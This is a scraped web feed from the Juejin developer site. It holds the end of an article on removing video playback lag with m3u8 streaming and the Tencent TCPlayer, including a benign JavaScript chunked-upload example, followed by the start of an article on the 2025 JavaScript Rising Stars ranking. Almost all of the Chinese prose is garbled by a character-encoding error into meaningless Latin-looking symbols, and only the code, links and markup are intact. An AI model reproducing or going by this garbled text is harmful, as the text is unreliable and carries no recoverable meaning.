<p>ç»¼åˆè€ƒè™‘ï¼Œè¿™ä¸ªå®ç°æˆæœ¬æœ‰ç‚¹å¤§ï¼Œå¤„ç†ä¸å¥½çš„è¯ä¹Ÿå®¹æ˜“å‡ºé—®é¢˜ã€‚æƒ³ç€æ˜¯ä¸æ˜¯å¯ä»¥è®©æ¶æ„ç»„å®ç°ä¸€ä¸‹ï¼Œæ¯•ç«Ÿè¿™ä¸ªåŠŸèƒ½å…¶ä»–ä¸šåŠ¡ä¹Ÿä¼šç”¨åˆ°ï¼Œåº”è¯¥åšä¸ºé€šç”¨çš„æ¥å£ä¼šåˆé€‚ç‚¹ï¼Œä¸ç„¶å„è‡ªå¼€å‘è¿™ä¸ªæˆæœ¬ä¹ŸæŒºå¤§ï¼ŒåŸºäºè¿™ä¸ªè€ƒè™‘ï¼Œå‰ç«¯å®ç°æ–¹æ¡ˆå¾…å®šã€‚</p>
<p><strong>3ï¼‰äº¤ç”±æ¶æ„ç»„æ”¯æŒè§†é¢‘æ–‡ä»¶è½¬æ¢ m3u8 æ ¼å¼ã€‚</strong></p>
<p>ç¬¬ä¸€æ—¶é—´ä¸æ¶æ„ç»„çš„ç›¸å…³äººå‘˜æ²Ÿé€šä¸‹è¯‰æ±‚ï¼Œè®²äº†ä¸‹æˆ‘ä»¬çš„ç°çŠ¶å’Œè¯‰æ±‚åŠæ”¶ç›Šï¼Œçœ‹èƒ½å¦æ”¯æŒä¸€ä¸‹ã€‚åé¢æˆ‘ä»¬è·Ÿäº§å“æ‹‰äº†ä¸ªä¼šè®®ç®€å•æ²Ÿé€šäº†ä¸€ä¸‹ï¼Œæ¶æ„è´Ÿè´£äººè¡¨ç¤ºèƒ½å¤Ÿæ”¯æŒã€‚åœ¨ä¸æ¶æ„æ²Ÿé€šä¸­ç»™äº† 3 ç§æ–¹æ¡ˆç»™æˆ‘ä»¬é€‰æ‹©ï¼š</p>
<ul>
<li>å‰ç«¯è°ƒç”¨ sdk ä¸Šä¼ åå†è°ƒç”¨è½¬ç æ¥å£ï¼›ï¼ˆä¸Šä¼ æ—¶é•¿è¾ƒé•¿ï¼‰</li>
<li>å‰ç«¯ä¸Šä¼ åæ‰”ç»™åç«¯å¤„ç†åˆ†ç‰‡ä¸Šä¼ ï¼Œç„¶åå†è½¬ç æ¥å£ï¼›ï¼ˆå‹åŠ›ç»™åˆ°åç«¯ï¼‰</li>
<li>å‰ç«¯è°ƒç”¨åˆ†ç‰‡æ¥å£ä¸Šä¼ ï¼Œå®Œæˆåå†è°ƒè½¬ç æ¥å£ï¼ˆå‰ç«¯è°ƒç”¨ä¸Šä¼ åˆ†ç‰‡æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦è°ƒ 3 ä¸ªæ­¥éª¤æ¥å£ï¼Œå†è°ƒè½¬ç æ¥å£ï¼‰</li>
</ul>
<p>ä»£ç å®ç°æƒ…å†µå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//å‰ç«¯åˆ†ç‰‡ä¸Šä¼ </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">chunkFile</span>(<span class="hljs-params">file, chunkSize</span>) {
  <span class="hljs-keyword">const</span> fileSize = file.<span class="hljs-property">size</span>;
  <span class="hljs-keyword">let</span> offset = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">while</span> (offset &lt; fileSize) {
    <span class="hljs-keyword">const</span> chunk = file.<span class="hljs-title function_">slice</span>(offset, offset + chunkSize);
    <span class="hljs-title function_">uploadChunk</span>(chunk); <span class="hljs-comment">// ä¸Šä¼ å—åˆ°æœåŠ¡å™¨è¿›è¡Œå¤„ç†</span>

    offset += chunkSize;
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">uploadChunk</span>(<span class="hljs-params">chunk</span>) {
  <span class="hljs-comment">// è¿™é‡Œä»…ä½œä¸ºç¤ºä¾‹ï¼Œä½ éœ€è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œé€‚å½“ä¿®æ”¹</span>
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'chunk'</span>, chunk);

  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/upload'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">body</span>: formData
  })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {
      <span class="hljs-comment">// å¤„ç†å“åº”</span>
    })
    .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
      <span class="hljs-comment">// å¤„ç†é”™è¯¯</span>
    });
}

<span class="hljs-comment">// ç¤ºä¾‹ç”¨æ³•</span>
<span class="hljs-keyword">const</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'file-input'</span>);

fileInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'change'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];
  <span class="hljs-keyword">const</span> chunkSize = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// æ¯ä¸ªå—çš„å¤§å°ï¼ˆè¿™é‡Œè®¾ä¸º1MBï¼‰</span>

  <span class="hljs-title function_">chunkFile</span>(file, chunkSize);
});

</code></pre>
<p>åŸºäºè¿™ 3 ç§æ–¹æ¡ˆï¼Œè€ƒè™‘ç›®å‰ç®¡ç†ç«¯å¯¹ä¸Šä¼ æ—¶é•¿ä¹Ÿæ²¡å¤ªå¤§è¯‰æ±‚ã€‚æˆ‘ä»¬å°±é€‰æ‹©ç®€å•ä¸€ç‚¹ï¼Œäºæ˜¯é€‰æ‹©ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œåˆ†ç‰‡çš„æ–¹æ¡ˆå¯ä»¥å…ˆå®ç°ï¼Œåç»­ä¸šåŠ¡å¯¹è¿™å—æœ‰ç—›ç‚¹çš„è¯ï¼Œæˆ‘ä»¬å†åˆ‡æ¢æˆåˆ†ç‰‡ä¸Šä¼ çš„å½¢å¼ï¼Œæœ€ç»ˆé‡‡ç”¨çš„æ–¹æ¡ˆæ˜¯ï¼šåˆ‡æ¢è…¾è®¯ TCPlayer æ’­æ”¾å™¨+æµåª’ä½“æ ¼å¼æ’­æ”¾ï¼Œè¿™ä¸ªå¡é¡¿é—®é¢˜å¾—äºˆè§£å†³ã€‚</p>
<p>æœ€ç»ˆå‘ˆç°æ•ˆæœå›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a7751778bc5479dbf9b945e935dae7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=Kb652mNum89aYDofx8xTFZ0vRgY%3D" alt="è§†é¢‘æ’­æ”¾æ ·å¼æ•ˆæœ" loading="lazy"/></p>
<h2 data-id="heading-6">æŠ€æœ¯éš¾ç–‘</h2>
<p>è¿™é‡Œä¸»è¦æ˜¯ä½¿ç”¨ TCPlayer æ’­æ”¾æµåª’ä½“æ ¼å¼çš„åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œè®°å½•ä¸‹æ¥æ–¹ä¾¿ç»™åç»­ä½¿ç”¨çš„äººé¿å…è¸©å‘ã€‚</p>
<ol>
<li>æç¤º lack license url é”™è¯¯ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/073f49f1a802474a8861dd0e0e0a5636~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=ydWS8qgFq0ue9RvWyDi%2FsJWF9CM%3D" alt="licenseæŠ¥é”™" loading="lazy"/></p>
<p>web æ’­æ”¾å™¨åŸºç¡€ç‰ˆæ˜¯å…è´¹çš„ï¼Œéœ€è¦ç”³è¯·ä¸‹ license æ‰è¡Œï¼Œæ¯æ¬¡ä¸€å¹´çš„æœŸé™ï¼Œè¿‡æœŸåéœ€è¦è‡ªè¡Œç»­æœŸã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ed9cff87ec8480eb89ab409c65cc4e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=T3bW6NKouHHJZa%2B2ailfvBarzRQ%3D" alt="æ’­æ”¾å™¨æ–‡æ¡£" loading="lazy"/></p>
<ol start="2">
<li>æ§åˆ¶å°ä¼šæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œä½†è¿™å¹¶ä¸ä¼šå¯¹åŠŸèƒ½çš„æ­£å¸¸ä½¿ç”¨é€ æˆå½±å“ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå»ºè®®å‡çº§ tcplayer.js åˆ° 5.1.0 ç‰ˆæœ¬ã€‚è¿™ä¸ªæ›´æ–°ç‰ˆæœ¬èƒ½å¤Ÿæœ‰æ•ˆè§£å†³è¯¥é”™è¯¯ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa9c594e776e434d835fdcff8f39bb30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=YwE95YgCT1hkGlPhYO4h0HHp4wc%3D" alt="æ’­æ”¾å™¨æŠ¥é”™" loading="lazy"/></p>
<ol start="3">
<li>åœ¨å¤šä¸ªè§†é¢‘åˆ†é¡µåˆ‡æ¢æ—¶ï¼Œæˆ‘å‘ç°ä¸€ä¸ªåˆå§‹åŒ–çš„é—®é¢˜ã€‚åœ¨ç‚¹å‡»ä¸‹ä¸€é¡µä¹‹å‰ï¼Œæˆ‘ä¼šé”€æ¯æ‰€æœ‰çš„è…¾è®¯äº‘æ’­æ”¾å™¨å®ä¾‹ã€‚ç„¶è€Œï¼Œå½“åˆ‡æ¢åˆ°ä¸‹ä¸€é¡µæ—¶ï¼Œä½¿ç”¨åŒä¸€ä¸ªè§†é¢‘æ ‡ç­¾çš„è§†é¢‘ä¹Ÿä¼šè¢«ç§»é™¤ï¼Œç»“æœå¯¼è‡´ä¸‹ä¸€ä¸ªè§†é¢‘æ¶ˆå¤±äº†ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3416c53c5cb340588a067e0690fc7ac1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=F4hMhALnFlMus2qvmnQGci5G5uc%3D" alt="æ§åˆ¶å°" loading="lazy"/></p>
<br/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73f7d918447c4308b128840351693def~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=x0HBHAnAtKh8m53T0iKWoYHIEqw%3D" alt="æ§åˆ¶å°" loading="lazy"/></p>
<p>ç»è¿‡ä¸è…¾è®¯å‰ç«¯æŠ€æœ¯æ²Ÿé€šåï¼Œå¯èƒ½å¯¹æˆ‘ä»¬çš„ä¸šåŠ¡ä¸å¤ªäº†è§£ï¼Œæ²¡æ³•æƒ³è±¡å‡ºé—®é¢˜æ˜¯å’‹æ ·çš„ã€‚å¯¹æ­¤ä»–ä»¬ä¹Ÿæ²¡æœ‰ç»™å‡ºæ˜ç¡®çš„è§£å†³å»ºè®®ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å†³å®šè‡ªè¡Œå¤„ç†è¯¥é€»è¾‘ã€‚åœ¨ç»è¿‡ä¸€ç•ªæ€è€ƒåï¼Œæˆ‘æ„è¯†åˆ°æ¨¡æ¿æ²¡æœ‰é‡æ–°æ¸²æŸ“æ˜¯ä¸€ä¸ªå¯èƒ½å¯¼è‡´é—®é¢˜çš„åŸå› ã€‚äºæ˜¯ç¬¬äºŒå¤©ï¼Œæˆ‘å°è¯•äº†å¦å¤–ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œåœ¨åˆ‡æ¢é¡µç æ—¶ï¼Œå¼ºåˆ¶å°† v-if åˆ¤æ–­è¯­å¥è®¾ä¸º falseï¼Œç„¶ååœ¨è·å–åˆ°æ•°æ®åå†å°†å…¶è®¾ä¸º trueã€‚ç»“æœå‡ºä¹æ„æ–™åœ°æˆåŠŸäº†ï¼è¿™æ ·ä¸€æ¥ï¼Œæ¨¡æ¿å¾—ä»¥é‡æ–°æ¸²æŸ“ï¼Œé—®é¢˜ä¹Ÿå¾—åˆ°äº†è§£å†³ã€‚æ ¸å¿ƒé—®é¢˜å°±æ˜¯ç›¸åŒåœ°å€çš„è§†é¢‘é‡‡ç”¨çš„ id å€¼å¯¼è‡´æ’­æ”¾å™¨å®ä¾‹é‡å¤äº†ï¼Œé”€æ¯åå…¶å…¶ä»–ç›¸åŒåœ°å€ id çš„è§†é¢‘ä¹Ÿè¢«é”€æ¯äº†ï¼Œæ‰€ä»¥éœ€è¦æ¯æ¬¡åˆ‡æ¢é¡µç çš„æ—¶å€™éƒ½è¦æ¸²æŸ“æ¨¡ç‰ˆæ‰èƒ½åŠ è½½æˆåŠŸã€‚</p>
<h2 data-id="heading-7">æœ€å</h2>
<p>ä¸Šçº¿æ—¶éš”ä¸€å¹´ï¼Œå„ä¸šåŠ¡éƒ¨é—¨å†ä¹Ÿæ²¡æœ‰åé¦ˆè¿‡è§†é¢‘å¡é¡¿çš„é—®é¢˜ã€‚è¿™ä¸€æ”¹è¿›è¿‡ç¨‹ä¸­å¾—åˆ°äº†ä¸šåŠ¡åé¦ˆçš„ç§¯æå›åº”ï¼Œè¡¨ç¤ºè§†é¢‘åŠ è½½é€Ÿåº¦æ˜¾è‘—æå‡ï¼Œè§†é¢‘ä½“éªŒæ›´åŠ é¡ºç•…ã€‚</p>
<p>è¿‡å»ï¼Œç”¨æˆ·åœ¨åŠ è½½è§†é¢‘æ—¶å¸¸å¸¸é‡åˆ° 3-5 ç§’ç”šè‡³æ›´é•¿çš„ç­‰å¾…æ—¶é—´ï¼Œç»™è§‚çœ‹ä½“éªŒå¸¦æ¥äº†å›°æ‰°ã€‚ç°åœ¨ï¼Œåˆ‡æ¢åŠ è½½é€Ÿåº¦æå¤§æå‡ï¼Œä»…éœ€ä¸åˆ° 1 ç§’çš„æ—¶é—´å³å¯åŠ è½½å®Œæˆã€‚é€šè¿‡ä»¥ä¸Šæ–¹æ¡ˆçš„è°ƒç ”åŠæµ‹è¯•ï¼Œæˆ‘ä»¬æˆåŠŸæ¶ˆé™¤äº†è§†é¢‘æ’­æ”¾å¡é¡¿çš„é—®é¢˜ï¼Œå¤§å¤§æå‡äº†ç”¨æˆ·çš„è§‚çœ‹ä½“éªŒï¼Œåç»­å°†æŒç»­å…³æ³¨å¹¶ä¼˜åŒ–è§†é¢‘æ’­æ”¾ï¼Œä»¥ç¡®ä¿ç”¨æˆ·èƒ½å¤Ÿäº«å—åˆ°æœ€ä½³çš„è§‚çœ‹ä½“éªŒã€‚</p>
<p>PSï¼šå¦‚æœæ‚¨æœ‰æ›´å¥½çš„å®ç°æ–¹å¼æˆ–è€…ç–‘é—®ï¼Œæ¬¢è¿åœ¨åº•éƒ¨ç•™è¨€æ¢è®¨ã€‚</p>
<blockquote>
<p>è½¬è½¬ç ”å‘ä¸­å¿ƒåŠä¸šç•Œå°ä¼™ä¼´ä»¬çš„æŠ€æœ¯å­¦ä¹ äº¤æµå¹³å°ï¼Œå®šæœŸåˆ†äº«ä¸€çº¿çš„å®æˆ˜ç»éªŒåŠä¸šç•Œå‰æ²¿çš„æŠ€æœ¯è¯é¢˜ã€‚
å…³æ³¨å…¬ä¼—å·ã€Œè½¬è½¬æŠ€æœ¯ã€ï¼ˆç»¼åˆæ€§ï¼‰ã€ã€Œå¤§è½¬è½¬FEã€ï¼ˆä¸“æ³¨äºFEï¼‰ã€ã€Œè½¬è½¬QAã€ï¼ˆä¸“æ³¨äºQAï¼‰ï¼Œæ›´å¤šå¹²è´§å®è·µï¼Œæ¬¢è¿äº¤æµåˆ†äº«~</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´æœ€ç«çš„å‰ç«¯é¡¹ç›®å‡ºç‚‰ï¼ŒNo.1 æ˜“ä¸»ï¼]]></title>    <link>https://juejin.cn/post/7592134330313179179</link>    <guid>https://juejin.cn/post/7592134330313179179</guid>    <pubDate>2026-01-07T06:44:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592134330313179179" data-draft-id="7592040819819085865" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´æœ€ç«çš„å‰ç«¯é¡¹ç›®å‡ºç‚‰ï¼ŒNo.1 æ˜“ä¸»ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-07T06:44:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´æœ€ç«çš„å‰ç«¯é¡¹ç›®å‡ºç‚‰ï¼ŒNo.1 æ˜“ä¸»ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T06:44:42.000Z" title="Wed Jan 07 2026 06:44:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    206
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å‰è¨€</h2>
<p>å¿«æ¥çœ‹ï¼JavaScript Rising Stars å…¬å¸ƒäº† <a href="https://link.juejin.cn?target=https%3A%2F%2Frisingstars.js.org%2F2025%2Fen" target="_blank" title="https://risingstars.js.org/2025/en" ref="nofollow noopener noreferrer">2025 å¹´ JavaScript æ˜æ˜Ÿé¡¹ç›®æ¦œå•</a>ã€‚</p>
<p>æ­¤æ¦œå•æ ¹æ® 2025 å¹´ GitHub æ–°å¢çš„æ˜Ÿæ ‡æ•°é‡ï¼Œè¿˜å»ºç«‹äº†ä»¥ä¸‹æ¦œå•ï¼š</p>
<p>æœ€å—æ¬¢è¿çš„é¡¹ç›®ã€å‰ç«¯æ¡†æ¶ã€React ç”Ÿæ€ç³»ç»Ÿã€åç«¯/å…¨æ ˆã€æ„å»ºå·¥å…·ã€äººå·¥æ™ºèƒ½ã€ç§»åŠ¨ç«¯ã€Vue ç”Ÿæ€ç³»ç»Ÿã€çŠ¶æ€ç®¡ç†ã€CSS in JSã€ç»„ä»¶åº“ã€æµ‹è¯•ã€æ¡Œé¢ç«¯ã€é™æ€ç«™ç‚¹ã€GraphQLã€‚</p>
<p>è®©æˆ‘ä»¬çœ‹ä¸€çœ‹éƒ½æ˜¯å“ªäº›é¡¹ç›®ä¸Šæ¦œäº†ã€‚</p>
<h2 data-id="heading-1">2. æœ€å—æ¬¢è¿é¡¹ç›®</h2>
<p>2025 æœ€å—æ¬¢è¿çš„ JavaScript é¡¹ç›® Top 10 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ecc272d2c4642718e4c97fdd49be41b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=zjsMca3LufT5Xvmu6eJi44k8u4g%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">2.1. æ€»å† å†›ï¼šn8n ğŸ†</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fn8n.io%2F" target="_blank" title="https://n8n.io/" ref="nofollow noopener noreferrer">n8n</a> æ˜¯ 2025 å¹´çš„ç»å¯¹èµ¢å®¶ï¼Œä¸€å¹´å†…è·å¾—äº†è¶…è¿‡ 112000 ä¸ªæ˜Ÿæ ‡ã€‚è¿‡å¾€ä»æ¥æ²¡æœ‰ä¸€ä¸ªé¡¹ç›®åœ¨ä¸€å¹´å†…è·å¾—å¦‚æ­¤å¤šçš„æ˜Ÿæ ‡ã€‚</p>
<p>n8n æ˜¯ä¸€ä¸ªå·¥ä½œæµè‡ªåŠ¨åŒ–å¹³å°ï¼Œå…·å¤‡åŸç”Ÿ AI åŠŸèƒ½ï¼Œå¯é€šè¿‡å¯è§†åŒ–å·¥ä½œæµè¿æ¥å„ç§åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ã€‚å®ƒçš„æˆåŠŸåæ˜ äº†å¸‚åœºå¯¹æ— ä»£ç è‡ªåŠ¨åŒ–å·¥å…·æ—¥ç›Šå¢é•¿çš„éœ€æ±‚ã€‚</p>
<p>æ­¤å¤–ï¼Œåœ¨å‰ 10 ä¸­è¿˜æœ‰ 3 ä¸ªä¸ AI æœ‰å…³çš„é¡¹ç›®ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fonlook.com%2F" target="_blank" title="https://onlook.com/" ref="nofollow noopener noreferrer">Onlook</a>ï¼šä¸º React åº”ç”¨å¸¦æ¥ AI ä¼˜å…ˆçš„è§†è§‰ç¼–è¾‘åŠŸèƒ½</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdyad.sh%2F" target="_blank" title="https://dyad.sh/" ref="nofollow noopener noreferrer">Dyad</a>ï¼šä¸€æ¬¾å…è´¹ã€æœ¬åœ°åŒ–ã€å¼€æºçš„ AI åº”ç”¨æ„å»ºå™¨ï¼Œä¹Ÿæ˜¯ v0/lovable/Bolt çš„æ›¿ä»£æ–¹æ¡ˆ</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fstagehand.dev%2F" target="_blank" title="https://stagehand.dev/" ref="nofollow noopener noreferrer">Stagehand</a>ï¼šAI é©±åŠ¨çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–</li>
</ul>
<h3 data-id="heading-3">2.2. äºšå†›ï¼šReact Bits</h3>
